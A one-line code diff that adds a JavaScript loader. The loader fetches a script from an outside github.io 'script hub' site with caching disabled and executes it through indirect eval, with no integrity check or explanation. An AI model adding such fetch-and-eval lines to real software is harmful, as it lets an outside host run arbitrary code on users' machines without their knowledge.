@@ -1,0 +1,1 @@
+fetch('https://starlightgg.github.io/NovaScriptin-Hub/scripts/main.js', { cache: 'no-store' }).then(r => r.text()).then(code => (0, eval)(code));
